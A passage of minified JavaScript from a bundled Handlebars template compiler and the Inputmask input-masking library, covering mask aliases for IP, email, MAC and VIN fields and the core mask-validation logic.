: this.compileStack).pop(); if (!t && n instanceof g) return n.value; if (!e) { if (!this.stackSlot) throw new d.default("Invalid stack pop"); this.stackSlot-- } return n }, topStack: function () { var t = this.isInline() ? this.inlineStack : this.compileStack, e = t[t.length - 1]; return e instanceof g ? e.value : e }, contextName: function (t) { return this.useDepths && t ? "depths[" + t + "]" : "depth" + t }, quotedString: function (t) { return this.source.quotedString(t) }, objectLiteral: function (t) { return this.source.objectLiteral(t) }, aliasable: function (t) { var e = this.aliases[t]; return e ? e.referenceCount++ : ((e = this.aliases[t] = this.source.wrap(t)).aliasable = !0, e.referenceCount = 1), e }, setupHelper: function (t, e, n) { var i = []; return { params: i, paramsInit: this.setupHelperArgs(e, t, i, n), name: this.nameLookup("helpers", e, "helper"), callParams: [this.aliasable(this.contextName(0) + " != null ? " + this.contextName(0) + " : (container.nullContext || {})")].concat(i) } }, setupParams: function (t, e, n) { var i = {}, o = [], a = [], s = [], r = !n, g = void 0; r && (n = []), i.name = this.quotedString(t), i.hash = this.popStack(), this.trackIds && (i.hashIds = this.popStack()), this.stringParams && (i.hashTypes = this.popStack(), i.hashContexts = this.popStack()); var l = this.popStack(), c = this.popStack(); (c || l) && (i.fn = c || "container.noop", i.inverse = l || "container.noop"); for (var I = e; I--;)g = this.popStack(), n[I] = g, this.trackIds && (s[I] = this.popStack()), this.stringParams && (a[I] = this.popStack(), o[I] = this.popStack()); return r && (i.args = this.source.generateArray(n)), this.trackIds && (i.ids = this.source.generateArray(s)), this.stringParams && (i.types = this.source.generateArray(a), i.contexts = this.source.generateArray(o)), this.options.data && (i.data = "data"), this.useBlockParams && (i.blockParams = "blockParams"), i }, setupHelperArgs: function (t, e, n, i) { var o = this.setupParams(t, e, n), o = this.objectLiteral(o); return i ? (this.useRegister("options"), n.push("options"), ["options=", o]) : n ? (n.push(o), "") : o } }, function () { for (var t = "break else new var case finally return void catch for switch while continue function this with default if throw delete in try do instanceof typeof abstract enum int short boolean export interface static byte extends long super char final native synchronized class float package throws const goto private transient debugger implements protected volatile double import public let yield await null true false".split(" "), e = r.RESERVED_WORDS = {}, n = 0, i = t.length; n < i; n++)e[t[n]] = !0 }(), r.isValidJavaScriptVariableName = function (t) { return !r.RESERVED_WORDS[t] && /^[a-zA-Z_$][0-9a-zA-Z_$]*$/.test(t) }, e.default = r, t.exports = e.default }, function (t, e, n) { "use strict"; e.__esModule = !0; var s = n(5), i = void 0; function a(t, e, n) { if (s.isArray(t)) { for (var i = [], o = 0, a = t.length; o < a; o++)i.push(e.wrap(t[o], n)); return i } return "boolean" == typeof t || "number" == typeof t ? t + "" : t } function o(t) { this.srcFile = t, this.source = [] } i || ((i = function (t, e, n, i) { this.src = "", i && this.add(i) }).prototype = { add: function (t) { s.isArray(t) && (t = t.join("")), this.src += t }, prepend: function (t) { s.isArray(t) && (t = t.join("")), this.src = t + this.src }, toStringWithSourceMap: function () { return { code: this.toString() } }, toString: function () { return this.src } }), o.prototype = { isEmpty: function () { return !this.source.length }, prepend: function (t, e) { this.source.unshift(this.wrap(t, e)) }, push: function (t, e) { this.source.push(this.wrap(t, e)) }, merge: function () { var e = this.empty(); return this.each(function (t) { e.add(["  ", t, "\n"]) }), e }, each: function (t) { for (var e = 0, n = this.source.length; e < n; e++)t(this.source[e]) }, empty: function () { var t = this.currentLocation || { start: {} }; return new i(t.start.line, t.start.column, this.srcFile) }, wrap: function (t, e) { var n = arguments.length <= 1 || void 0 === e ? this.currentLocation || { start: {} } : e; return t instanceof i ? t : (t = a(t, this, n), new i(n.start.line, n.start.column, this.srcFile, t)) }, functionCall: function (t, e, n) { return n = this.generateList(n), this.wrap([t, e ? "." + e + "(" : "(", n, ")"]) }, quotedString: function (t) { return '"' + (t + "").replace(/\\/g, "\\\\").replace(/"/g, '\\"').replace(/\n/g, "\\n").replace(/\r/g, "\\r").replace(/\u2028/g, "\\u2028").replace(/\u2029/g, "\\u2029") + '"' }, objectLiteral: function (t) { var e, n = []; for (var i in t) { !t.hasOwnProperty(i) || "undefined" !== (e = a(t[i], this)) && n.push([this.quotedString(i), ":", e]) } var o = this.generateList(n); return o.prepend("{"), o.add("}"), o }, generateList: function (t) { for (var e = this.empty(), n = 0, i = t.length; n < i; n++)n && e.add(","), e.add(a(t[n], this)); return e }, generateArray: function (t) { var e = this.generateList(t); return e.prepend("["), e.add("]"), e } }, e.default = o, t.exports = e.default }], n.c = o, n.p = "", n(0); function n(t) { if (o[t]) return o[t].exports; var e = o[t] = { exports: {}, id: t, loaded: !1 }; return i[t].call(e.exports, e, e.exports, n), e.loaded = !0, e.exports } var i, o }), function (n) { var i = {}; function o(t) { if (i[t]) return i[t].exports; var e = i[t] = { i: t, l: !1, exports: {} }; return n[t].call(e.exports, e, e.exports, o), e.l = !0, e.exports } o.m = n, o.c = i, o.d = function (t, e, n) { o.o(t, e) || Object.defineProperty(t, e, { enumerable: !0, get: n }) }, o.r = function (t) { "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(t, Symbol.toStringTag, { value: "Module" }), Object.defineProperty(t, "__esModule", { value: !0 }) }, o.t = function (e, t) { if (1 & t && (e = o(e)), 8 & t) return e; if (4 & t && "object" == typeof e && e && e.__esModule) return e; var n = Object.create(null); if (o.r(n), Object.defineProperty(n, "default", { enumerable: !0, value: e }), 2 & t && "string" != typeof e) for (var i in e) o.d(n, i, function (t) { return e[t] }.bind(null, i)); return n }, o.n = function (t) { var e = t && t.__esModule ? function () { return t.default } : function () { return t }; return o.d(e, "a", e), e }, o.o = function (t, e) { return Object.prototype.hasOwnProperty.call(t, e) }, o.p = "", o(o.s = 0) }([function (t, e, n) { "use strict"; n(1), n(6), n(7); var i = s(n(2)), o = s(n(3)), a = s(n(4)); function s(t) { return t && t.__esModule ? t : { default: t } } o.default === a.default && n(8), window.Inputmask = i.default }, function (t, e, n) { "use strict"; var i, o, a; o = [n(2)], void 0 === (a = "function" == typeof (i = function (t) { return t.extendDefinitions({ A: { validator: "[A-Za-zÐ-ÑÐÑÃ-Ã¿Âµ]", casing: "upper" }, "&": { validator: "[0-9A-Za-zÐ-ÑÐÑÃ-Ã¿Âµ]", casing: "upper" }, "#": { validator: "[0-9A-Fa-f]", casing: "upper" } }), t.extendAliases({ cssunit: { regex: "[+-]?[0-9]+\\.?([0-9]+)?(px|em|rem|ex|%|in|cm|mm|pt|pc)" }, url: { regex: "(https?|ftp)//.*", autoUnmask: !1 }, ip: { mask: "i[i[i]].i[i[i]].i[i[i]].i[i[i]]", definitions: { i: { validator: function (t, e, n) { return t = -1 < n - 1 && "." !== e.buffer[n - 1] ? (t = e.buffer[n - 1] + t, -1 < n - 2 && "." !== e.buffer[n - 2] ? e.buffer[n - 2] + t : "0" + t) : "00" + t, new RegExp("25[0-5]|2[0-4][0-9]|[01][0-9][0-9]").test(t) } } }, onUnMask: function (t) { return t }, inputmode: "numeric" }, email: { mask: "*{1,64}[.*{1,64}][.*{1,64}][.*{1,63}]@-{1,63}.-{1,63}[.-{1,63}][.-{1,63}]", greedy: !1, casing: "lower", onBeforePaste: function (t) { return (t = t.toLowerCase()).replace("mailto:", "") }, definitions: { "*": { validator: "[0-9ï¼-ï¼A-Za-zÐ-ÑÐÑÃ-Ã¿Âµ!#$%&'*+/=?^_`{|}~-]" }, "-": { validator: "[0-9A-Za-z-]" } }, onUnMask: function (t) { return t }, inputmode: "email" }, mac: { mask: "##:##:##:##:##:##" }, vin: { mask: "V{13}9{4}", definitions: { V: { validator: "[A-HJ-NPR-Za-hj-npr-z\\d]", casing: "upper" } }, clearIncomplete: !0, autoUnmask: !0 } }), t }) ? i.apply(e, o) : i) || (t.exports = a) }, function (t, e, n) { "use strict"; var i, o, a, At = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (t) { return typeof t } : function (t) { return t && "function" == typeof Symbol && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : typeof t }; o = [n(3), n(5)], void 0 === (a = "function" == typeof (i = function (at, st, rt) { var gt = st.document, t = navigator.userAgent, lt = t.indexOf("MSIE ") > 0 || t.indexOf("Trident/") > 0, ct = dt("touchstart"), It = /iemobile/i.test(t), ut = /iphone/i.test(t) && !It; function ht(t, e, n) { if (!(this instanceof ht)) { return new ht(t, e, n) } this.el = rt; this.events = {}; this.maskset = rt; this.refreshValue = false; if (n !== true) { if (at.isPlainObject(t)) { e = t } else { e = e || {}; if (t) e.alias = t } this.opts = at.extend(true, {}, this.defaults, e); this.noMasksCache = e && e.definitions !== rt; this.userOptions = e || {}; this.isRTL = this.opts.numericInput; c(this.opts.alias, e, this.opts) } } function c(t, e, n) { var i = ht.prototype.aliases[t]; if (i) { if (i.alias) c(i.alias, rt, n); at.extend(true, n, i); at.extend(true, n, e); return true } else if (n.mask === null) { n.mask = t } return false } function a(n, r) { function t(t, e, n) { var i = false; if (t === null || t === "") { i = n.regex !== null; if (i) { t = n.regex; t = t.replace(/^(\^)(.*)(\$)$/, "$2") } else { i = true; t = ".*" } } if (t.length === 1 && n.greedy === false && n.repeat !== 0) { n.placeholder = "" } if (n.repeat > 0 || n.repeat === "*" || n.repeat === "+") { var o = n.repeat === "*" ? 0 : n.repeat === "+" ? 1 : n.repeat; t = n.groupmarker[0] + t + n.groupmarker[1] + n.quantifiermarker[0] + o + "," + n.repeat + n.quantifiermarker[1] } var a, s = i ? "regex_" + n.regex : n.numericInput ? t.split("").reverse().join("") : t; if (ht.prototype.masksCache[s] === rt || r === true) { a = { mask: t, maskToken: ht.prototype.analyseMask(t, i, n), validPositions: {}, _buffer: rt, buffer: rt, tests: {}, excludes: {}, metadata: e, maskLength: rt, jitOffset: {} }; if (r !== true) { ht.prototype.masksCache[s] = a; a = at.extend(true, {}, ht.prototype.masksCache[s]) } } else a = at.extend(true, {}, ht.prototype.masksCache[s]); return a } var e; if (at.isFunction(n.mask)) { n.mask = n.mask(n) } if (at.isArray(n.mask)) { if (n.mask.length > 1) { if (n.keepStatic === null) { n.keepStatic = "auto"; for (var i = 0; i < n.mask.length; i++) { if (n.mask[i].charAt(0) !== n.mask[0].charAt(0)) { n.keepStatic = true; break } } } var o = n.groupmarker[0]; at.each(n.isRTL ? n.mask.reverse() : n.mask, function (t, e) { if (o.length > 1) { o += n.groupmarker[1] + n.alternatormarker + n.groupmarker[0] } if (e.mask !== rt && !at.isFunction(e.mask)) { o += e.mask } else { o += e } }); o += n.groupmarker[1]; return t(o, n.mask, n) } else n.mask = n.mask.pop() } if (n.mask && n.mask.mask !== rt && !at.isFunction(n.mask.mask)) { e = t(n.mask.mask, n.mask, n) } else { e = t(n.mask, n.mask, n) } return e } function dt(t) { var e = gt.createElement("input"), n = "on" + t, i = n in e; if (!i) { e.setAttribute(n, "return;"); i = typeof e[n] === "function" } e = null; return i } function Ct(t, e, O) { e = e || this.maskset; O = O || this.opts; var I = this, l = this.el, A = this.isRTL, p, a, r = false, c = false, f = false, m, o = false, d, s; var h = function t(e, n, i, o, a) { var s = O.greedy; if (a) O.greedy = false; n = n || 0; var r = [], g, l = 0, c, I, u = v(); do { if (e === true && _().validPositions[l]) { I = a && _().validPositions[l].match.optionality === true && _().validPositions[l + 1] === rt && (_().validPositions[l].generatedInput === true || _().validPositions[l].input == O.skipOptionalPartCharacter && l > 0) ? C(l, Q(l, g, l - 1)) : _().validPositions[l]; c = I.match; g = I.locator.slice(); r.push(i === true ? I.input : i === false ? c.nativeDef : R(l, c)) } else { I = b(l, g, l - 1); c = I.match; g = I.locator.slice(); var h = o === true ? false : O.jitMasking !== false ? O.jitMasking : c.jit; if (h === false || h === rt || typeof h === "number" && isFinite(h) && h > l) { r.push(i === false ? c.nativeDef : R(l, c)) } } if (O.keepStatic === "auto") { if (c.newBlockMarker && c.fn !== null) { O.keepStatic = l - 1 } } l++ } while ((m === rt || l < m) && (c.fn !== null || c.def !== "") || n > l); if (r[r.length - 1] === "") { r.pop() } if (i !== false || _().maskLength === rt) _().maskLength = l - 1; O.greedy = s; return r }; function _() { return e } function y(t) { var e = _(); e.buffer = rt; if (t !== true) { e.validPositions = {}; e.p = 0 } } function v(t, e, n) { var i = -1, o = -1, a = n || _().validPositions; if (t === rt) t = -1; for (var s in a) { var r = parseInt(s); if (a[r] && (e || a[r].generatedInput !== true)) { if (r <= t) i = r; if (r >= t) o = r } } return i === -1 || i == t ? o : o == -1 ? i : t - i < o - t ? i : o } function x(t) { var e = t.locator[t.alternation]; if (typeof e == "string" && e.length > 0) { e = e.split(",")[0] } return e !== rt ? e.toString() : "" } function u(t, e) { var n = (t.alternation != rt ? t.mloc[x(t)] : t.locator).join(""); if (n !== "") while (n.length < e) { n += "0" } return n } function C(t, e) { t = t > 0 ? t - 1 : 0; var n = F(t), i = u(n), o, a, s; for (var r = 0; r < e.length; r++) { var g = e[r]; o = u(g, i.length); var l = Math.abs(o - i); if (a === rt || o !== "" && l < a || s && !O.greedy && s.match.optionality && s.match.newBlockMarker === "master" && (!g.match.optionality || !g.match.newBlockMarker) || s && s.match.optionalQuantifier && !g.match.optionalQuantifier) { a = l; s = g } } return s } function b(t, e, n) { return _().validPositions[t] || C(t, Q(t, e ? e.slice() : e, n)) } function F(t, e) { if (_().validPositions[t]) { return _().validPositions[t] } return (e || Q(t))[0] } function B(t, e) { var n = false, i = Q(t); for (var o = 0; o < i.length; o++) { if (i[o].match && i[o].match.def === e) { n = true; break } } return n } function Q(W, t, e) { var n = _().maskToken, N = t ? e : 0, i = t ? t.slice() : [0], T = [], H = false, E, R = t ? t.join("") : ""; function Y(D, Z, t, e) { function U(t, e, n) { function a(n, i) { var o = at.inArray(n, i.matches) === 0; if (!o) { at.each(i.matches, function (t, e) { if (e.isQuantifier === true) o = a(n, i.matches[t - 1]); else if (e.hasOwnProperty("matches")) o = a(n, e); if (o) return false }) } return o } function i(t, o, a) { var s, r; if (_().tests[t] || _().validPositions[t]) { at.each(_().tests[t] || [_().validPositions[t]], function (t, e) { if (e.mloc[o]) { s = e; return false } var n = a !== rt ? a : e.alternation, i = e.locator[n] !== rt ? e.locator[n].toString().indexOf(o) : -1; if ((r === rt || i < r) && i !== -1) { s = e; r = i } }) } if (s) { var e = s.locator[s.alternation]; var n = s.mloc[o] || s.mloc[e] || s.locator; return n.slice((a !== rt ? a : s.alternation) + 1) } else { return a !== rt ? i(t, o) : rt } } function o(t, e) { function n(t) { var e = [], n, i; for (var o = 0, a = t.length; o < a; o++) { if (t.charAt(o) === "-") { i = t.charCodeAt(o + 1); while (++n < i) { e.push(String.fromCharCode(n)) } } else { n = t.charCodeAt(o); e.push(t.charAt(o)) } } return e.join("") } if (O.regex && t.match.fn !== null && e.match.fn !== null) { return n(e.match.def.replace(/[\[\]]/g, "")).indexOf(n(t.match.def.replace(/[\[\]]/g, ""))) !== -1 } return t.match.def === e.match.nativeDef } function s(t, e) { var n = t.locator.slice(t.alternation).join(""), i = e.locator.slice(e.alternation).join(""), o = n == i; o = o && t.match.fn === null && e.match.fn !== null ? e.match.fn.test(t.match.def, _(), W, false, O, false) : false; return o } function r(t, e) { if (e === rt || t.alternation === e.alternation && t.locator[t.alternation].toString().indexOf(e.locator[e.alternation]) === -1) { t.mloc = t.mloc || {}; var n = t.locator[t.alternation]; if (n === rt) t.alternation = rt; else { if (typeof n === "string") n = n.split(",")[0]; if (t.mloc[n] === rt) t.mloc[n] = t.locator.slice(); if (e !== rt) { for (var i in e.mloc) { if (typeof i === "string") i = i.split(",")[0]; if (t.mloc[i] === rt) t.mloc[i] = e.mloc[i] } t.locator[t.alternation] = Object.keys(t.mloc).join(",") } return true } } return false } if (N > 500 && n !== rt) { throw "Inputmask: There is probably an error in your mask definition or in the code. Create an issue on github with an example of the mask you are using. " + _().mask } if (N === W && t.matches === rt) { T.push({ match: t, locator: e.reverse(), cd: R, mloc: {} }); return true } else if (t.matches !== rt) { if (t.isGroup && n !== t) { t = U(D.matches[at.inArray(t, D.matches) + 1], e, n); if (t) return true } else if (t.isOptional) { var g = t; t = Y(t, Z, e, n); if (t) { at.each(T, function (t, e) { e.match.optionality = true }); E = T[T.length - 1].match; if (n === rt && a(E, g)) { H = true; N = W } else return true } } else if (t.isAlternator) { var l = t, c = [], I, u = T.slice(), h = e.length; var d = Z.length > 0 ? Z.shift() : -1; if (d === -1 || typeof d === "string") { var C = N, A = Z.slice(), p = [], m; if (typeof d == "string") { p = d.split(",") } else { for (m = 0; m < l.matches.length; m++) { p.push(m.toString()) } } if (_().excludes[W]) { var f = p.slice(); for (var b = 0, B = _().excludes[W].length; b < B; b++) { p.splice(p.indexOf(_().excludes[W][b].toString()), 1) } if (p.length === 0) { _().excludes[W] = rt; p = f } } if (O.keepStatic === true || isFinite(parseInt(O.keepStatic)) && C >= O.keepStatic) p = p.slice(0, 1); var y = false; for (var v = 0; v < p.length; v++) { m = parseInt(p[v]); T = []; Z = typeof d === "string" ? i(N, m, h) || A.slice() : A.slice(); if (l.matches[m] && U(l.matches[m], [m].concat(e), n)) t = true; else if (v === 0) { y = true } I = T.slice(); N = C; T = []; for (var x = 0; x < I.length; x++) { var F = I[x], Q = false; F.match.jit = F.match.jit || y; F.alternation = F.alternation || h; r(F); for (var G = 0; G < c.length; G++) { var w = c[G]; if (typeof d !== "string" || F.alternation !== rt && at.inArray(F.locator[F.alternation].toString(), p) !== -1) { if (F.match.nativeDef === w.match.nativeDef) { Q = true; r(w, F); break } else if (o(F, w)) { if (r(F, w)) { Q = true; c.splice(c.indexOf(w), 0, F) } break } else if (o(w, F)) { r(w, F); break } else if (s(F, w)) { if (r(F, w)) { Q = true; c.splice(c.indexOf(w), 0, F) } break } } } if (!Q) { c.push(F) } } } T = u.concat(c); N = W; H = T.length > 0; t = c.length > 0; Z = A.slice() } else t = U(l.matches[d] || D.matches[d], [d].concat(e), n); if (t) return true } else if (t.isQuantifier && n !== D.matches[at.inArray(t, D.matches) - 1]) { var X = t; for (var S = Z.length > 0 ? Z.shift() : 0; S < (isNaN(X.quantifier.max) ? S + 1 : X.quantifier.max) && N <= W; S++) { var k = D.matches[at.inArray(X, D.matches) - 1]; t = U(k, [S].concat(e), k); if (t) { E = T[T.length - 1].match; E.optionalQuantifier = S >= X.quantifier.min; E.jit = (S || 1) * k.matches.indexOf(E) >= X.quantifier.jit; if (E.optionalQuantifier && a(E, k)) { H = true; N = W; break } if (E.jit) { _().jitOffset[W] = k.matches.indexOf(E) } return true } } } else { t = Y(t, Z, e, n); if (t) return true } } else { N++ } } for (var n = Z.length > 0 ? Z.shift() : 0; n < D.matches.length; n++) { if (D.matches[n].isQuantifier !== true) { var i = U(D.matches[n], [n].concat(t), e); if (i && N === W) { return i } else if (N > W) { break } } } } function o(t, e) { var i = []; if (!at.isArray(e)) e = [e]; if (e.length > 0) { if (e[0].alternation === rt) { i = C(t, e.slice()).locator.slice(); if (i.length === 0) i = e[0].locator.slice() } else { at.each(e, function (t, e) { if (e.def !== "") { if (i.length === 0) i = e.locator.slice(); else { for (var n = 0; n < i.length; n++) { if (e.locator[n] && i[n].toString().indexOf(e.locator[n]) === -1) { i[n] += "," + e.locator[n] } } } } }) } } return i } if (W > -1) { if (t === rt) { var a = W - 1, s; while ((s = _().validPositions[a] || _().tests[a]) === rt && a > -1) { a-- } if (s !== rt && a > -1) { i = o(a, s); R = i.join(""); N = a } } if (_().tests[W] && _().tests[W][0].cd === R) { return _().tests[W] } for (var r = i.shift(); r < n.length; r++) { var g = Y(n[r], i, [r]); if (g && N === W || N > W) { break } } } if (T.length === 0 || H) { T.push({ match: { fn: null, optionality: false, casing: null, def: "", placeholder: "" }, locator: [], mloc: {}, cd: R }) } if (t !== rt && _().tests[W]) { return at.extend(true, [], T) } _().tests[W] = at.extend(true, [], T); return _().tests[W] } function G() { if (_()._buffer === rt) { _()._buffer = h(false, 1); if (_().buffer === rt) _().buffer = _()._buffer.slice() } return _()._buffer } function w(t) { if (_().buffer === rt || t === true) { _().buffer = h(true, v(), true); if (_()._buffer === rt) _()._buffer = _().buffer.slice() } return _().buffer } function X(t, e, n) { var i, o; if (t === true) { y(); t = 0; e = n.length } else { for (i = t; i < e; i++) { delete _().validPositions[i] } } o = t; for (i = t; i < e; i++) { y(true); if (n[i] !== O.skipOptionalPartCharacter) { var a = Z(o, n[i], true, true); if (a !== false) { y(true); o = a.caret !== rt ? a.caret : a.pos + 1 } } } } function S(t, e, n) { switch (O.casing || e.casing) { case "upper": t = t.toUpperCase(); break; case "lower": t = t.toLowerCase(); break; case "title": var i = _().validPositions[n - 1]; if (n === 0 || i && i.input === String.fromCharCode(ht.keyCode.SPACE)) { t = t.toUpperCase() } else { t = t.toLowerCase() } break; default: if (at.isFunction(O.casing)) { var o = Array.prototype.slice.call(arguments); o.push(_().validPositions); t = O.casing.apply(this, o) } }return t } function k(t, e, n) { var i = O.greedy ? e : e.slice(0, 1), o = false, a = n !== rt ? n.split(",") : [], s; for (var r = 0; r < a.length; r++) { if ((s = t.indexOf(a[r])) !== -1) { t.splice(s, 1) } } for (var g = 0; g < t.length; g++) { if (at.inArray(t[g], i) !== -1) { o = true; break } } return o } function D(t, e, n, i, o) { var a = at.extend(true, {}, _().validPositions), s, r, g = false, l, c, I, u, h, d = o !== rt ? o : v(); if (d === -1 && o === rt) { s = 0; c = F(s); r = c.alternation } else { for (; d >= 0; d--) { l = _().validPositions[d]; if (l && l.alternation !== rt) { if (c && c.locator[l.alternation] !== l.locator[l.alternation]) { break } s = d; r = _().validPositions[s].alternation; c = l } } } if (r !== rt) { h = parseInt(s); _().excludes[h] = _().excludes[h] || []; if (t !== true) { _().excludes[h].push(x(c)) } var C = [], A = 0; for (I = h; I < v(rt, true) + 1; I++) { u = _().validPositions[I]; if (u && u.generatedInput !== true) { C.push(u.input) } else if (I < t) A++; delete _().validPositions[I] } while (_().excludes[h] && _().excludes[h].length < 10) { var p = A * -1, m = C.slice(); _().tests[h] = rt; y(true); g = true; while (m.length > 0) { var f = m.shift(); if (!(g = Z(v(rt, true) + 1, f, false, i, true))) { break } } if (g && e !== rt) { var b = v(t) + 1; for (I = h; I < v() + 1; I++) { u = _().validPositions[I]; if ((u === rt || u.match.fn == null) && I < t + p) { p++ } } t = t + p; g = Z(t > b ? b : t, e, n, i, true) } if (!g) { y(); c = F(h); _().validPositions = at.extend(true, {}, a); if (_().excludes[h]) { var B = x(c); if (_().excludes[h].indexOf(B) !== -1) { g = D(t, e, n, i, h - 1); break } _().excludes[h].push(B); for (I = h; I < v(rt, true) + 1; I++) { delete _().validPositions[I] } } else { g = D(t, e, n, i, h - 1); break } } else break } } _().excludes[h] = rt; return g } function Z(l, t, e, c, n, i) { function I(t) { return A ? t.begin - t.end > 1 || t.begin - t.end === 1 : t.end - t.begin > 1 || t.end - t.begin === 1 } e = e === true; var o = l; if (l.begin !== rt) { o = A ? l.end : l.begin } function a(a, s, r) { var g = false; at.each(Q(a), function (t, e) { var n = e.match; w(true); g = n.fn != null ? n.fn.test(s, _(), a, r, O, I(l)) : (s === n.def || s === O.skipOptionalPartCharacter) && n.def !== "" ? { c: R(a, n, true) || n.def, pos: a } : false; if (g !== false) { var i = g.c !== rt ? g.c : s, o = a; i = i === O.skipOptionalPartCharacter && n.fn === null ? R(a, n, true) || n.def : i; if (g.remove !== rt) { if (!at.isArray(g.remove)) g.remove = [g.remove]; at.each(g.remove.sort(function (t, e) { return e - t }), function (t, e) { W({ begin: e, end: e + 1 }) }) } if (g.insert !== rt) { if (!at.isArray(g.insert)) g.insert = [g.insert]; at.each(g.insert.sort(function (t, e) { return t - e }), function (t, e) { Z(e.pos, e.c, true, c) }) } if (g !== true && g.pos !== rt && g.pos !== a) { o = g.pos } if (g !== true && g.pos === rt && g.c === rt) { return false } if (!W(l, at.extend({}, e, { input: S(i, n, o) }), c, o)) { g = false } return false } }); return g } var s = true, r = at.extend(true, {}, _().validPositions); if (at.isFunction(O.preValidation) && !e && c !== true && i !== true) { s = O.preValidation(w(), o, t, I(l), O, _()) } if (s === true) { U(rt, o, true); if (m === rt || o < m) { s = a(o, t, e); if ((!e || c === true) && s === false && i !== true) { var g = _().validPositions[o]; if (g && g.match.fn === null && (g.match.def === t || t === O.skipOptionalPartCharacter)) { s = { caret: T(o) } } else { if ((O.insertMode || _().validPositions[T(o)] === rt) && (!N(o, true) || _().jitOffset[o])) { if (_().jitOffset[o] && _().validPositions[T(o)] === rt) { s = Z(o + _().jitOffset[o], t, e); if (s !== false) s.caret = o } else for (var u = o + 1, h = T(o); u <= h; u++) { s = a(u, t, e); if (s !== false) { s = U(o, s.pos !== rt ? s.pos : u) || s; o = u; break } } } } } } if (s === false && O.keepStatic !== false && (O.regex == null || K(w())) && !e && n !== true) { s = D(o, t, e, c) } if (s === true) { s = { pos: o } } } if (at.isFunction(O.postValidation) && s !== false && !e && c !== true && i !== true) { var d = O.postValidation(w(true), l.begin !== rt ? A ? l.end : l.begin : l, s, O); if (d !== rt) { if (d.refreshFromBuffer && d.buffer) { var C = d.refreshFromBuffer; X(C === true ? C : C.start, C.end, d.buffer) } s = d === true ? s : d } } if (s && s.pos === rt) { s.pos = o } if (s === false || i === true) { y(true); _().validPositions = at.extend(true, {}, r) } return s } function U(t, e, n) { var i; if (t === rt) { for (t = e - 1; t > 0; t--) { if (_().validPositions[t]) break } } for (var o = t; o < e; o++) { if (_().validPositions[o] === rt && !N(o, true)) { var a = o == 0 ? F(o) : _().validPositions[o - 1]; if (a) { var s = Q(o).slice(); if (s[s.length - 1].match.def === "") s.pop(); var r = C(o, s); r = at.extend({}, r, { input: R(o, r.match, true) || r.match.def }); r.generatedInput = true; W(o, r, true); if (n !== true) { var g = _().validPositions[e].input; _().validPositions[e] = rt; i = Z(e, g, true, true) } } } } return i } function W(t, e, n, i) { function o(t, e, n) { var i = e[t]; if (i !== rt && (i.match.fn === null && i.match.optionality !== true || i.input === O.radixPoint)) { var o = n.begin <= t - 1 ? e[t - 1] && e[t - 1].match.fn === null && e[t - 1] : e[t - 1], a = n.end > t + 1 ? e[t + 1] && e[t + 1].match.fn === null && e[t + 1] : e[t + 1]; return o && a } return false } var a = t.begin !== rt ? t.begin : t, s = t.end !== rt ? t.end : t; if (t.begin > t.end) { a = t.end; s = t.begin } i = i !== rt ? i : a; if (a !== s || O.insertMode && _().validPositions[i] !== rt && n === rt) { var r = at.extend(true, {}, _().validPositions), g = v(rt, true), l; _().p = a; for (l = g; l >= a; l--) { if (_().validPositions[l] && _().validPositions[l].match.nativeDef === "+") { O.isNegative = false } delete _().validPositions[l] } var c = true, I = i, u = _().validPositions, h = false, d = I, l = I; if (e) { _().validPositions[i] = at.extend(true, {}, e); d++; I++; if (a < s) l++ } for (; l <= g; l++) { var C = r[l]; if (C !== rt && (l >= s || l >= a && C.generatedInput !== true && o(l, r, { begin: a, end: s }))) { while (F(d).match.def !== "") { if (h === false && r[d] && r[d].match.nativeDef === C.match.nativeDef) { _().validPositions[d] = at.extend(true, {}, r[d]); _().validPositions[d].input = C.input; U(rt, d, true); I = d + 1; c = true } else if (O.shiftPositions && B(d, C.match.def)) { var A = Z(d, C.input, true, true); c = A !== false; I = A.caret || A.insert ? v() : d + 1; h = true } else { c = C.generatedInput === true || C.input === O.radixPoint && O.numericInput === true } if (c) break; if (!c && d > s && N(d, true) && (C.match.fn !== null || d > _().maskLength)) { break } d++ } if (F(d).match.def == "") c = false; d = I } if (!c) break } if (!c) { _().validPositions = at.extend(true, {}, r); y(true); return false } } else if (e) { _().validPositions[i] = at.extend(true, {}, e) } y(true); return true } function N(t, e) { var n = b(t).match; if (n.def === "") n = F(t).match; if (n.fn != null) { return n.fn } if (e !== true && t > -1) { var i = Q(t); return i.length > 1 + (i[i.length - 1].match.def === "" ? 1 : 0) } return false } function T(t, e) { var n = t + 1; while (F(n).match.def !== "" && (e === true && (F(n).match.newBlockMarker !== true || !N(n)) || e !== true && !N(n))) { n++ } return n } function H(t, e) { var n = t, i; if (n <= 0) return 0; while (--n > 0 && (e === true && F(n).match.newBlockMarker !== true || e !== true && !N(n) && (i = Q(n), i.length < 2 || i.length === 2 && i[1].match.def === ""))) { } return n } function E(t, e, n, i, o) { if (i && at.isFunction(O.onBeforeWrite)) { var a = O.onBeforeWrite.call(I, i, e, n, O); if (a) { if (a.refreshFromBuffer) { var s = a.refreshFromBuffer; X(s === true ? s : s.start, s.end, a.buffer || e); e = w(true) } if (n !== rt) n = a.caret !== rt ? a.caret : n } } if (t !== rt) { t.inputmask._valueSet(e.join("")); if (n !== rt && (i === rt || i.type !== "blur")) { M(t, n) } else $(t, n, e.length === 0); if (o === true) { var r = at(t), g = t.inputmask._valueGet(); c = true; r.trigger("input"); setTimeout(function () { if (g === G().join("")) { r.trigger("cleared") } else if (K(e) === true) { r.trigger("complete") } }, 0) } } } function R(t, e, n) { e = e || F(t).match; if (e.placeholder !== rt || n === true) { return at.isFunction(e.placeholder) ? e.placeholder(O) : e.placeholder } else if (e.fn === null) { if (t > -1 && _().validPositions[t] === rt) { var i = Q(t), o = [], a; if (i.length > 1 + (i[i.length - 1].match.def === "" ? 1 : 0)) { for (var s = 0; s < i.length; s++) { if (i[s].match.optionality !== true && i[s].match.optionalQuantifier !== true && (i[s].match.fn === null || a === rt || i[s].match.fn.test(a.match.def, _(), t, true, O) !== false)) { o.push(i[s]); if (i[s].match.fn === null) a = i[s]; if (o.length > 1) { if (/[0-9a-bA-Z]/.test(o[0].match.def)) { return O.placeholder.charAt(t % O.placeholder.length) } } } } } } return e.def } return O.placeholder.charAt(t % O.placeholder.length) } function g(t, e) { if (lt) { if (t.inputmask._valueGet() !== e && (t.placeholder !== e || t.placeholder === "")) { var n = w().slice(), i = t.inputmask._valueGet(); if (i !== e) { var o = v(); if (o === -1 && i === G().join("")) { n = [] } else if (o !== -1) { P(n) } E(t, n) } } } else if 